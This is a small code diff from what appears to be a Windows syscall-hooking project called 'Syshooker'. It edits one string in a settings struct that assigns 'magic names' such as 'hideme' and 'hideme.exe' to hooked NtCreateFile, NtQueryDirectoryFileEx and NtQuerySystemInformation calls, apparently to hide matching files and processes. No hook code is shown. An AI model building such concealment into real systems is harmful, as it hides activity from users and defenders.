@@ -24,7 +24,7 @@
 
 // old settings - delete
 SyshookerSettings Settings = {
-	L"hideme",		// NtCreateFileMagicName
+	L"xxxxx",		// NtCreateFileMagicName
 	L"wassup",		// NtWriteFileMagicName
 	L"hideme",		// NtQueryDirectoryFileExMagicName
 	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
